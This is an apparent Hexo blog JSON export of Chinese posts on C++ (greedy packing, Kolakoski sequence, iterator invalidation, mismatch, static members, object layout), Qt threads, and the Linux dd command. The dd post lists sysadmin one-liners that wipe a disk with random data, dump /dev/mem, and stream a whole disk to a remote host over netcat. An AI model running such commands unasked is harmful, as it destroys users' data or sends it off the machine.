++i) &#123; int temp; std::cin &gt;&gt; temp; box[i] = temp; sum += temp; &#125; if (sum == 0) &#123; break; &#125; //如果边长是3 4 5 6 int ans = box[5] + box[4] + box[3] + (box[2] + 3) / 4; //需要边长为2的box数量 int len_2 = box[3] * 5 + mon[(box[2] % 4)]; //2*2 box数量剩余时，需要增加box的数量 if (len_2 &lt; box[1]) &#123; ans += (box[1] - len_2 + 8) / 9; &#125; //需要边长为1的box数量 int len_1 = ans * 36 - box[5] * 36 - box[4] * 25 - box[3] * 16 - box[2] * 9 - box[1] * 4; if (len_1 &lt; box[0]) &#123; ans += (box[0] - len_1 + 35) / 36; &#125; result.push_back(ans); &#125; //容器的最后一行一定是000000 for (int i = 0; i &lt; result.size(); ++i) &#123; std::cout &lt;&lt; result[i] &lt;&lt; std::endl; &#125;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"acm","slug":"acm","permalink":"http://coordinate.wang/tags/acm/"},{"name":"贪心算法","slug":"贪心算法","permalink":"http://coordinate.wang/tags/贪心算法/"}]},{"title":"Kolakoski sequence","slug":"2017-08-28-Kolakoski sequence","date":"2017-08-27T16:00:00.000Z","updated":"2018-02-18T03:29:07.197Z","comments":true,"path":"2017/08/28/2017-08-28-Kolakoski sequence/","link":"","permalink":"http://coordinate.wang/2017/08/28/2017-08-28-Kolakoski sequence/","excerpt":"","text":"题目描述Kolakoski序列是个自生成的无限序列。 例如，当给定的整数组为[1,2]时，Kolakoski序列是这样的： [1,2,2,1,1,2,1,2,2,1,2,2,1,1,2……] 如果我们将相邻的相同的数字分成一组，那么将会得到： [[1],[2,2],[1,1],[2],[1],[2,2],[1],[2,2],[1,1],[2]……..] 可以看出，每组数字交替由1，2组成。 接下来对每个分组求他的长度，得到： [1,2,2,1,1,2,1,2,2,1,2,2,1,1,2……] 输入描述输入有两行组成： 第一行包括两个整数n，m 第二行包括m个正整数a[] 数据规模限制： 0 &lt; n &lt; 10000 1 &lt; m &lt; 1000 0 &lt; a[i] &lt; 1000 a[i] != a[i+1] a[0] != a[m-1] 输出描述每行一个数字，共n行 整数组a生成的Kolakoski序列的前n项 问题的解决我觉得下面这个解法还不错 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;iterator&gt;#include &lt;algorithm&gt; //adjacent_findint main()&#123; int m, n; std::cout &lt;&lt; \"Enter number n,m:\\n\"; std::cin &gt;&gt; n &gt;&gt; m; if (n &lt;= 0 || n &gt;= 10000 || m &lt;= 1 || m &gt;= 1000) &#123; std::cout &lt;&lt; \"input error\"; return -1; &#125; std::vector&lt;int&gt; a(m); std::cout &lt;&lt; \"Enter m numbers:\\n\"; for (int i = 0; i &lt; m; i++) &#123; int temp; std::cin &gt;&gt; temp; a[i] = temp; &#125; if (a[0] == a[m - 1]) &#123; std::cout &lt;&lt; \"input error : a[0] == a[m - 1]\"; return -1; &#125; //查找相邻元素有很多做法，我这里使用的标准库里的做法 auto&amp;&amp; pan = std::adjacent_find(std::begin(a), std::end(a)); if (pan != a.end()) &#123; std::cout &lt;&lt; \"input error : have the same adjacent element\"; return -1; &#125; std::vector&lt;int&gt; result&#123;&#125;; for (int i = 0, j = 0; i &lt; n &amp;&amp; j &lt; n; ++i, ++j) &#123; int curNum = a[i % m]; result.push_back(curNum); for (int count = 1; count &lt; result[i] &amp;&amp; j &lt; n; ++count, ++j) &#123; result.push_back(curNum); &#125; &#125; std::copy(std::begin(result), std::end(result), std::ostream_iterator&lt;int&gt;(std::cout, \"\\n\")); system(\"pause\");&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"Kolakoski","slug":"Kolakoski","permalink":"http://coordinate.wang/tags/Kolakoski/"}]},{"title":"vector iterator not dereferencable","slug":"2017-08-27-vector iterator not dereferencable","date":"2017-08-26T16:00:00.000Z","updated":"2018-02-18T03:29:07.176Z","comments":true,"path":"2017/08/27/2017-08-27-vector iterator not dereferencable/","link":"","permalink":"http://coordinate.wang/2017/08/27/2017-08-27-vector iterator not dereferencable/","excerpt":"","text":"今天碰到这样一个问题，在对如下问题编译时出现了这样的报错信息 vector iterator not dereferencable，这个报错信息非常的常见。以下是程序的出错片段： 123456789101112131415161718192021222324252627void show_hands(Hands&amp; hands, Deck&amp; deck)&#123; auto d = dist(); //每个人输出一个牌，最后全部放在deck中 while (deck.size() != 52) &#123; std::vector&lt;Card&gt; tempHand; Card maxCard&#123;&#125;; for (auto&amp; iter = std::begin(hands); iter &lt; std::end(hands); ++iter) &#123; size_t max_index = (*iter).size() - 1; d.param(Range&#123; 0, max_index &#125;); auto tIter = std::begin(*iter); std::advance(tIter, d(rng())); deck.push_back(*tIter); tempHand.push_back(*tIter); std::cout &lt;&lt; *tIter &lt;&lt; std::endl; (*iter).erase(tIter); //注意的是erase是传入的指针变量 Card tempCard = *tIter; //报错位置 maxCard = std::max(maxCard, tempCard, [](const auto&amp; crd1, const auto&amp; crd2) &#123; return crd1.first &lt; crd2.first || (crd1.first == crd2.first &amp;&amp; crd1.second &lt; crd2.second); &#125;); &#125; std::cout &lt;&lt; \"最大的牌是：\" &lt;&lt; maxCard &lt;&lt; std::endl &lt;&lt; std::endl; &#125; &#125; 其实这个问题很不应该，很明显可以看出我是在对 tIter做了 erase 操作后，又使用*tIter 。原因在于 erase 操作后原来的指针就不存在了，自然再去访问就会报错。 还有一种情况就是访问越界，它也会造成这样的问题。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"error","slug":"error","permalink":"http://coordinate.wang/tags/error/"}]},{"title":"关于新的工作环境","slug":"2017-08-26-关于新的工作环境","date":"2017-08-25T16:00:00.000Z","updated":"2018-02-18T03:29:07.176Z","comments":true,"path":"2017/08/26/2017-08-26-关于新的工作环境/","link":"","permalink":"http://coordinate.wang/2017/08/26/2017-08-26-关于新的工作环境/","excerpt":"","text":"既来之，则安之！","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"Eassy","slug":"Eassy","permalink":"http://coordinate.wang/tags/Eassy/"}]},{"title":"QT的线程结束问题","slug":"2017-08-20-QT的线程结束问题","date":"2017-08-19T16:00:00.000Z","updated":"2018-02-18T03:29:07.176Z","comments":true,"path":"2017/08/20/2017-08-20-QT的线程结束问题/","link":"","permalink":"http://coordinate.wang/2017/08/20/2017-08-20-QT的线程结束问题/","excerpt":"","text":"在QT中，线程退出主要有三种方式： void quit() 相当于exit(0) void exit(int returnCode = 0) 调用exit后，thread将退出event loop，并从exec返回，exec的返回值就是returnCode。通常returnCode返回成功，其他值返回失败。 void terminate() 强行终止线程 主要用法： thread-&gt;quit(); thread-&gt;wait(); thread-&gt;terminate(); thread-&gt;wait(); 注意这种方式并不是非常的实用 要注意的是，在每次调用线程退出后，都要调用一次wait()函数。不然会出问题。","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"thread","slug":"thread","permalink":"http://coordinate.wang/tags/thread/"},{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/tags/QT/"},{"name":"quit","slug":"quit","permalink":"http://coordinate.wang/tags/quit/"},{"name":"wait","slug":"wait","permalink":"http://coordinate.wang/tags/wait/"}]},{"title":"深度探索c++对象模型(5)","slug":"2017-08-16-深度探索c++对象模型(5)","date":"2017-08-15T16:00:00.000Z","updated":"2018-02-18T03:29:07.160Z","comments":true,"path":"2017/08/16/2017-08-16-深度探索c++对象模型(5)/","link":"","permalink":"http://coordinate.wang/2017/08/16/2017-08-16-深度探索c++对象模型(5)/","excerpt":"","text":"关于虚拟构造函数12345678910111213141516171819202122232425262728class Base1&#123;public: Base1(); virtual ~Base1(); virtual void speakClearly(); virtual Base1 *clone() const; //函数的返回类型是类本身protected: float data_Base1;&#125;;class Base2&#123;public: Base2(); virtual ~Base2(); virtual void mumble(); virtual Base2 *clone() const; //函数的返回类型是类本身protected: float data_Base2;&#125;;class Deriverd : public Base1, public Base2&#123;public: virtual ~Deriverd(); virtual Deriverd *clone() const;//函数的返回类型是类本身protected: float data_Derived;&#125;; 通过之前的调试技巧.html)我们可以得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691&gt; class Base1 size(8):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | data_Base11&gt; +---1&gt;1&gt; Base1::$vftable@:1&gt; | &amp;Base1_meta1&gt; | 01&gt; 0 | &amp;Base1::&#123;dtor&#125;1&gt; 1 | &amp;Base1::speakClearly1&gt; 2 | &amp;Base1::clone1&gt;1&gt; Base1::&#123;dtor&#125; this adjustor: 01&gt; Base1::speakClearly this adjustor: 01&gt; Base1::clone this adjustor: 01&gt; Base1::__delDtor this adjustor: 01&gt; Base1::__vecDelDtor this adjustor: 01&gt;1&gt; class Base2 size(8):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | data_Base21&gt; +---1&gt;1&gt; Base2::$vftable@:1&gt; | &amp;Base2_meta1&gt; | 01&gt; 0 | &amp;Base2::&#123;dtor&#125;1&gt; 1 | &amp;Base2::mumble1&gt; 2 | &amp;Base2::clone 1&gt;1&gt; Base2::&#123;dtor&#125; this adjustor: 01&gt; Base2::mumble this adjustor: 01&gt; Base2::clone this adjustor: 01&gt; Base2::__delDtor this adjustor: 01&gt; Base2::__vecDelDtor this adjustor: 01&gt;1&gt; class Deriverd size(20):1&gt; +---1&gt; 0 | +--- (base class Base1)1&gt; 0 | | &#123;vfptr&#125;1&gt; 4 | | data_Base11&gt; | +---1&gt; 8 | +--- (base class Base2)1&gt; 8 | | &#123;vfptr&#125;1&gt; 12 | | data_Base21&gt; | +---1&gt; 16 | data_Derived1&gt; +---1&gt;1&gt; Deriverd::$vftable@Base1@:1&gt; | &amp;Deriverd_meta1&gt; | 01&gt; 0 | &amp;Deriverd::&#123;dtor&#125;1&gt; 1 | &amp;Base1::speakClearly1&gt; 2 | &amp;Deriverd::clone //注意一下这里，在Lippman的对象模型书里面在这下面有一个Base2::mumble1&gt;1&gt; Deriverd::$vftable@Base2@:1&gt; | -81&gt; 0 | &amp;thunk: this-=8; goto Deriverd::&#123;dtor&#125;1&gt; 1 | &amp;Base2::mumble1&gt; 2 | &amp;thunk: this-=8; goto Base2* Deriverd::clone1&gt; 3 | &amp;thunk: this-=8; goto Deriverd* Deriverd::clone1&gt;1&gt; Deriverd::&#123;dtor&#125; this adjustor: 01&gt; Deriverd::clone this adjustor: 01&gt; Deriverd::__delDtor this adjustor: 01&gt; Deriverd::__vecDelDtor this adjustor: 0 我们可以从上面的 Deriverd::$vftable@Base2@ 可以看到里面使用了 thunk 的技法。 如果我们通过如下的方式调用 12Base2 *pb1 = new Derived;Base2 *pb2 = pb1-&gt;clone(); 当进行 pb1-&gt;clone() 时，会被调用指向 Deriverd 对象的起始地址，于是 clone() 的 Derived 版会被调用，它会传回一个指针，指向一个新的 Derived 对象，该对象的地址在被指定给pb2之前，必须先经过调整，以指向 Base2subobject","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"linux的dd命令","slug":"2017-08-14-linux的dd命令","date":"2017-08-13T16:00:00.000Z","updated":"2018-02-18T03:29:07.160Z","comments":true,"path":"2017/08/14/2017-08-14-linux的dd命令/","link":"","permalink":"http://coordinate.wang/2017/08/14/2017-08-14-linux的dd命令/","excerpt":"","text":"dd命令 语法格式 dd [option] dd指令选项详解 if=file：输入文件名，缺省为标准输入of=file：输出文件名，缺省为标准输出ibs=bytes：一次读入 bytes 个字节（即一个块大小为 bytes 个字节）obs=bytes：一次写 bytes 个字节（即一个块大小为 bytes 个字节）bs=bytes：同时设置读写块的大小为 bytes ，可代替 ibs 和 obscbs=bytes：一次转换 bytes 个字节，即转换缓冲区大小skip=blocks：从输入文件开头跳过 blocks 个块后再开始复制seek=blocks：从输出文件开头跳过 blocks 个块后再开始复制。（通常只有当输出文件是磁盘或磁带时才有效）count=blocks：仅拷贝 blocks 个块，块大小等于 ibs 指定的字节数conv=ASCII：把EBCDIC码转换为ASCIl码。conv=ebcdic：把ASCIl码转换为EBCDIC码。conv=ibm：把ASCIl码转换为alternate EBCDIC码。conv=block：把变动位转换成固定字符。conv=ublock：把固定位转换成变动位。conv=ucase：把字母由小写转换为大写。conv=lcase：把字母由大写转换为小写。conv=notrunc：不截短输出文件。conv=swab：交换每一对输入字节。conv=noerror：出错时不停止处理。conv=sync：把每个输入记录的大小都调到ibs的大小（用NUL填充）。iflag=FLAGS：指定读的方式FLAGS，参见“FLAGS参数说明”oflag=FLAGS：指定写的方式FLAGS，参见“FLAGS参数说明” FLAGS参数说明： append -append mode (makes sense only for output; conv=notrunc sug-gested)direct：读写数据采用直接IO方式；directory：读写失败除非是directory；dsync：读写数据采用同步IO；sync：同上，但是针对是元数据fullblock：堆积满block（accumulate full blocks of input ）(iflag only)；nonblock：读写数据采用非阻塞IO方式noatime：读写数据不更新访问时间 应用实例 将本地的/dev/hdb整盘备份到/dev/hdd dd if=/dev/hdb of=/dev/hdd 将/dev/hdb全盘数据备份到指定路径的image文件 dd if=/dev/hdb of=/root/image 将备份文件恢复到指定盘 dd if=/root/image of=/dev/hdb 备份/dev/hdb全盘数据，并利用gzip工具进行压缩，保存到指定路径 dd if=/dev/hdb | gzip &gt; /root/image.gz 将压缩的备份文件恢复到指定盘 gzip -dc /root/image.gz | dd of=/dev/hdb 备份与恢复MBR 备份磁盘开始的512个字节大小的MBR信息到指定文件： dd if=/dev/hda of=/root/image count=1 bs=512 count=1指仅拷贝一个块；bs=512指块大小为512个字节。 恢复： dd if=/root/image of=/dev/had 将备份的MBR信息写到磁盘开始部分 备份软盘 dd if=/dev/fd0 of=disk.img count=1 bs=1440k (即块大小为1.44M) 拷贝内存内容到硬盘 dd if=/dev/mem of=/root/mem.bin bs=1024 (指定块大小为1k) 9.拷贝光盘内容到指定文件夹，并保存为cd.iso文件 dd if=/dev/cdrom(hdc) of=/root/cd.iso 增加swap分区文件大小 第一步：创建一个大小为256M的文件： dd if=/dev/zero of=/swapfile bs=1024 count=262144 第二步：把这个文件变成swap文件： mkswap /swapfile 第三步：启用这个swap文件： swapon /swapfile 第四步：编辑/etc/fstab文件，使在每次开机时自动加载swap文件： /swapfile swap swap default 0 0 销毁磁盘数据 dd if=/dev/urandom of=/dev/hda1 注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。 测试硬盘的读写速度 dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file dd if=/root/1Gb.file bs=64k | dd of=/dev/null 通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。 确定硬盘的最佳块大小： dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file dd if=/dev/zero bs=2048 count=500000 of=/root/1Gb.file dd if=/dev/zero bs=4096 count=250000 of=/root/1Gb.file dd if=/dev/zero bs=8192 count=125000 of=/root/1Gb.file 通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。 修复硬盘： dd if=/dev/sda of=/dev/sda 或dd if=/dev/hda of=/dev/hda 当硬盘较长时间(一年以上)放置不使用后，磁盘上会产生magnetic flux point，当磁头读到这些区域时会遇到困难，并可能导致I/O错误。当这种情况影响到硬盘的第一个扇区时，可能导致硬盘报废。上边的命令有可能使这些数 据起死回生。并且这个过程是安全、高效的。 利用netcat远程备份 dd if=/dev/hda bs=16065b | netcat &lt; targethost-IP &gt; 1234 在源主机上执行此命令备份/dev/hda netcat -l -p 1234 | dd of=/dev/hdc bs=16065b 在目的主机上执行此命令来接收数据并写入/dev/hdc netcat -l -p 1234 | bzip2 &gt; partition.img netcat -l -p 1234 | gzip &gt; partition.img 以上两条指令是目的主机指令的变化分别采用bzip2、gzip对数据进行压缩，并将备份文件保存在当前目录。 将一个很大的视频文件中的第i个字节的值改成0x41（也就是大写字母A的ASCII值） echo A | dd of=bigfile seek=$i bs=1 count=1 conv=notrunc","categories":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://coordinate.wang/tags/linux/"},{"name":"dd","slug":"dd","permalink":"http://coordinate.wang/tags/dd/"}]},{"title":"advance与next的区别","slug":"2017-08-13-advance与next的区别","date":"2017-08-12T16:00:00.000Z","updated":"2018-02-18T03:29:07.145Z","comments":true,"path":"2017/08/13/2017-08-13-advance与next的区别/","link":"","permalink":"http://coordinate.wang/2017/08/13/2017-08-13-advance与next的区别/","excerpt":"","text":"std::advance modifies its argument returns nothing works on input iterators or better (or bi-directional iterators if a negative distance is given) std::next leaves its argument unmodified returns a copy of the argument, advanced by the specified amount works on forward iterators or better (or bi-directional iterators if a negative distance is given)) 前向迭代器ForwardIterator 与输入迭代器InputIterator 的区别在于输入迭代器自增后之前和该迭代器相等的都失效了。前向迭代器能够保证两个迭代器实例a与b，如果a==b，则一定也满足++a=++b，而输入迭代器不能保证这一点。 constexpr与const的区别：constexpr表示在编译期就可以算出来（前提是为了算出它所依赖的东西也是在编译期可以算出来的）。而const只保证了运行时不直接被修改（但这个东西仍然可能是个动态变量）。 例如，转自知乎夏洋 12345678910template&lt;int N&gt; class C&#123;&#125;;constexpr int FivePlus(int x) &#123; return 5 + x;&#125;void f(const int x) &#123; C&lt;x&gt; c1; // Error: x is not compile-time evaluable. C&lt;FivePlus(6)&gt; c2; // OK&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"advance","slug":"advance","permalink":"http://coordinate.wang/tags/advance/"},{"name":"next","slug":"next","permalink":"http://coordinate.wang/tags/next/"}]},{"title":"mismatch函数中的范围问题","slug":"2017-08-12-mismatch函数中的范围问题","date":"2017-08-11T16:00:00.000Z","updated":"2018-02-18T03:29:07.145Z","comments":true,"path":"2017/08/12/2017-08-12-mismatch函数中的范围问题/","link":"","permalink":"http://coordinate.wang/2017/08/12/2017-08-12-mismatch函数中的范围问题/","excerpt":"","text":"关于mismatch主要要聊的是下面这样的几个问题： 对于mismatch(iter1, end_iter1, iter2) 返回pair\\&lt;end_iter1, (iter2 + (end_iter1 - iter1))>，pair的成员second等于iter2加上第一序列的长度。如果第二序列比第一序列短，结果是未定义的。 对于mismatch(iter1, end_iter1, iter2, end_iter2) 当第一个序列比第二个序列长时，返回pair\\&lt;end_iter1, (iter2 + (end_iter1 - iter1))>，所以成员second为iter2加上第一个序列的长度 当第一个序列比第二个序列短时，返回pair\\&lt;(end_iter1 + (end_iter2 - iter2)), iter2 >，所以成员first为iter1加上第一个序列的长度 当第一个序列和第二个序列一样长时，返回pair\\&lt;end_iter1, end_iter2> 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt; // For standard streams#include &lt;vector&gt; // For vector container#include &lt;algorithm&gt; // For equal() algorithm#include &lt;string&gt; // For string class#include &lt;iterator&gt; // For stream iteratorsusing std::string;using word_iter = std::vector&lt;string&gt;::iterator;int main()&#123; std::vector&lt;string&gt; words1&#123; \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\" &#125;; std::vector&lt;string&gt; words2&#123; \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\", \"ten\" &#125;; auto iter1 = std::begin(words1); auto end_iter1 = std::end(words1); auto iter2 = std::begin(words2); auto end_iter2 = std::end(words2); // Lambda expression to output mismatch() result auto print_match = [](const std::pair&lt;word_iter, word_iter&gt;&amp; pr, const word_iter&amp; end_iter) &#123; if (pr.first != end_iter) std::cout &lt;&lt; \"\\nFirst pair of words that differ are \" &lt;&lt; *pr.first &lt;&lt; \" and \" &lt;&lt; *pr.second &lt;&lt; std::endl; else std::cout &lt;&lt; \"\\nRanges are identical.\" &lt;&lt; std::endl; &#125;; std::cout &lt;&lt; \"Container - words1: \"; std::copy(iter1, end_iter1, std::ostream_iterator&lt;string&gt;&#123;std::cout, \" \"&#125;); std::cout &lt;&lt; \"\\nContainer - words2: \"; std::copy(iter2, end_iter2, std::ostream_iterator&lt;string&gt;&#123;std::cout, \" \"&#125;); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; \"\\nCompare from words1[1] to end with words2:\"; print_match(std::mismatch(iter1 + 1, end_iter1, iter2), end_iter1); std::cout &lt;&lt; \"\\nCompare from words2[0] to second-to-last with words1:\"; print_match(std::mismatch(iter2, end_iter2 - 1, iter1), end_iter2 - 1); std::cout &lt;&lt; \"\\nCompare from words1[1] to words1[5] with words2:\"; print_match(std::mismatch(iter1 + 1, iter1 + 6, iter2), iter1 + 6); std::cout &lt;&lt; \"\\nCompare first 6 from words1 with first 6 in words2:\"; print_match(std::mismatch(iter1, iter1 + 6, iter2, iter2 + 6), iter1 + 6); std::cout &lt;&lt; \"\\nCompare all words1 with words2:\"; print_match(std::mismatch(iter1, end_iter1, iter2), end_iter1); std::cout &lt;&lt; \"\\nCompare all of words2 with all of words1:\"; print_match(std::mismatch(iter2, end_iter2, iter1, end_iter1), end_iter2); std::cout &lt;&lt; \"\\nCompare from words1[1] to end with words2[0] to second-to-last:\"; print_match(std::mismatch(iter1 + 1, end_iter1, iter2, end_iter2 - 1), end_iter1); auto&amp; iptr = std::mismatch(iter1 + 1, end_iter1, iter2, end_iter2); system(\"pause\");&#125; 输出结果为 1234567891011121314151617181920212223Container - words1: one two three four five six seven eight nineContainer - words2: two three four five six seven eight nine tenCompare from words1[1] to end with words2:Ranges are identical.Compare from words2[0] to second-to-last with words1:First pair of words that differ are two and oneCompare from words1[1] to words1[5] with words2:Ranges are identical.Compare first 6 from words1 with first 6 in words2:First pair of words that differ are one and twoCompare all words1 with words2:First pair of words that differ are one and twoCompare all of words2 with all of words1:First pair of words that differ are two and oneCompare from words1[1] to end with words2[0] to second-to-last:Ranges are identical. 查看iper，结果如下，first指向的是一个未知的字符串","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"mismatch","slug":"mismatch","permalink":"http://coordinate.wang/tags/mismatch/"},{"name":"algorithm","slug":"algorithm","permalink":"http://coordinate.wang/tags/algorithm/"}]},{"title":"iterator not incrementable 错误","slug":"2017-08-11-incrementable错误","date":"2017-08-10T16:00:00.000Z","updated":"2018-02-18T03:29:07.122Z","comments":true,"path":"2017/08/11/2017-08-11-incrementable错误/","link":"","permalink":"http://coordinate.wang/2017/08/11/2017-08-11-incrementable错误/","excerpt":"","text":"今天碰到这样一个问题，在对vector容器做删除操作的时候出现了这样的错误iterator not incrementable ，这个错误在vector容器运用的时候是个很细微的问题。代码如下 1234567891011121314151617181920Direction create_direction(Cards&amp; cards, size_t directin_size)&#123; Direction direction; size_t i&#123;&#125;; while (i &lt; directin_size) &#123; Distribution choose_card&#123; 0, cards.size() - 1 &#125;; Card card = cards[choose_card(gen_value)]; direction.insert(card); for (auto&amp; iter = std::begin(cards); iter != std::end(cards); ++iter) &#123; if (*iter == card) &#123; cards.erase(iter); //complie error &#125; &#125; ++i; &#125; return direction;&#125; 第一眼看这个代码确实是没有任何问题，后来查看了vector容器后发现，这个错误在于，我们在对容器做了erase操作后，iter后面的迭代器都失效了，所以再对失效的iter操作，自然是错误的。 这里的解决办法也非常的简单，在其后怎加一个break即可。 1234567...if (*iter == card)&#123; cards.erase(iter); //complie error break; //added&#125;...","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"error","slug":"error","permalink":"http://coordinate.wang/tags/error/"},{"name":"vector","slug":"vector","permalink":"http://coordinate.wang/tags/vector/"}]},{"title":"c++中的static member","slug":"2017-08-09-c++中的static member","date":"2017-08-08T16:00:00.000Z","updated":"2018-02-18T03:29:07.122Z","comments":true,"path":"2017/08/09/2017-08-09-c++中的static member/","link":"","permalink":"http://coordinate.wang/2017/08/09/2017-08-09-c++中的static member/","excerpt":"","text":"关于static member要注意的几个问题 静态数据成员仅仅在初始化时不受访问权限的约束 静态数据成员最好不要在.h文件中进行定义(初始化)，而是放在.cpp文件中定义(初始化) 静态数据成员实际上是类域中的全局变量。所以，静态数据成员的定义(初始化)不应该被放在头文件中。 其定义方式与全局变量相同。举例如下： xxx.h文件 12345class base&#123; private: static const int _i; //声明，标准c++支持有序类型在类体中初始化,但vc6不支持。 &#125;; xxx.cpp文件 1const int base::_i=10;//仅仅在定义(初始化)时不受private和protected访问限制. 静态数据成员被类的所有对象所共享，包括类的派生类的所有对象，即派生类和基类共享一个静态成员 1234567891011121314151617class base&#123; public : static int _num; //声明 &#125;; int base::_num=0; //静态数据成员的真正定义 class derived:public base&#123; &#125;; main() &#123; base a; derived b; a._num++; cout&lt;&lt;\"base class static data number _num is\"&lt;&lt;a._num&lt;&lt;endl; b._num++; cout&lt;&lt;\"derived class static data number _num is\"&lt;&lt;b._num&lt;&lt;endl; &#125; // 结果为1,2;可见派生类与基类共用一个静态数据成员。 静态数据成员的类型可是所属类自己，即在一个类中可以声明该类自己的类型的静态成员对象，但是，不可以定义普通的成员对象(指针可以) 1234567class base&#123; public : static base _object1; //正确，静态数据成员 base _object2; //错误 base *pObject; //正确，指针 base &amp;mObject; //正确，引用 &#125;; 这个类要能创建对象，需要定义带有参数初始化列表的构造函数，如下： 1234567class base&#123; public : static base _object1; //正确，静态数据成员 base *pObject; //正确，指针 base &amp;mObject; //正确，引用 base():mObject(*this)&#123;&#125; &#125;; 在const成员函数中，可以修改static成员变量的值。普通成员变量的值，是不能修改的 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class Student&#123;private: static int a; int b;public: void change() const; void setB(int b); int getB(); static int getA();&#125;;void Student::change() const&#123; a++; //这个可以，因为a是static成员变量。 b++; //不可以，因为b是普通成员变量(如果b不是成员变量(是全局变量，普通参数，函数内部定义的临时变量)也可以别修改)&#125;int Student::getA()&#123; return a;&#125;void Student::setB(int b)&#123; this-&gt;b = b;&#125;int Student::getB()&#123; return b;&#125;int Student::a = 5;int main(int argc,char *argv[])&#123; Student stu; stu.setB(10); stu.change(); cout&lt;&lt;Student::getA()&lt;&lt;endl; cout&lt;&lt;stu.getB()&lt;&lt;endl; return 0;&#125; 这里我们要注意的是const放在函数后面，从本质上来说是修饰*this，也就是说这个对象本身是不可以被修改的，但是这里有一个例外就是上面提到的static member，我认为可以修改的原因是，static 变量是存储在这个类的外面的，而不是存储在这个类的内部，虽然它是一个内部变量 static成员函数只能访问static成员，不能访问非static成员，并且static成员函数不能定义为virtual、const、volatile 函数","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"深度探索c++对象模型(4)","slug":"2017-08-07-深度探索c++对象模型(4)","date":"2017-08-06T16:00:00.000Z","updated":"2018-02-18T03:29:07.107Z","comments":true,"path":"2017/08/07/2017-08-07-深度探索c++对象模型(4)/","link":"","permalink":"http://coordinate.wang/2017/08/07/2017-08-07-深度探索c++对象模型(4)/","excerpt":"","text":"从最简单的问题开始1234class X&#123;&#125;;class Y:virtual public X&#123;&#125;;class Z:virtual public X&#123;&#125;;class A:public Y, public Z&#123;&#125;; 每个类的大小是多少呢？我在vs2015上面的得到的答案是这样的（这里我使用了一个小技巧，在vs中，在项目——属性——配置属性——C/C++——命令行——其他选项中添加选项“/d1reportAllClassLayout”。再次编译时候，编译器会输出所有定义类的对象模型。） 12345678910111213141516171819201&gt; class X size(1):1&gt; class Y size(4):1&gt; 0 | &#123;vbptr&#125;1&gt; +---1&gt; +--- (virtual base X)1&gt; class Z size(4):1&gt; +---1&gt; 0 | &#123;vbptr&#125;1&gt; +---1&gt; +--- (virtual base X)1&gt; class A size(8):1&gt; +---1&gt; 0 | +--- (base class Y)1&gt; 0 | | &#123;vbptr&#125;1&gt; | +---1&gt; 4 | +--- (base class Z)1&gt; 4 | | &#123;vbptr&#125;1&gt; | +---1&gt; +---1&gt; +--- (virtual base X) 我们可以看到这里的X的大小是1，这是被编译器安插进去的一个char。这使得class的两个不同的对象可以在内存中得到不同的地址。 我们再来看Y和Z。首先我们要明白的是实现虚继承，将要带来一些额外的负担——额外需要一个某种形式的指针。到目前为止，对于一个32位的机器来说Y、Z的大小应该为5，而不是8或者4。我们需要再考虑两点因素：内存对齐（alignment）和编译器的优化。 考虑内存对齐的原因，Y和Z的大小会增加到4的倍数，也就是相应的补齐3bytes。但是在现在大多数的编译器上做了这样的一个优化处理。因为既然我的类里面有了成员，那么就不需要为空的类按插一个char，那么这是类的大小就是4，所以也就不用3bytes去填补，所以最终Y和Z的大小就是4。关于内存对齐的问题，我不准备在本文展开。大家有兴趣可以参看我的另一篇文章关于内存对齐的总结 关于单继承问题我们先考虑一个简单的问题，单一继承并且没有virtual function 12345678class X &#123; int x;&#125;;class Y :public X &#123; int y;&#125;; 得到的结果是 1234567891011121&gt; class X size(4):1&gt; +---1&gt; 0 | x1&gt; +---1&gt;1&gt; class Y 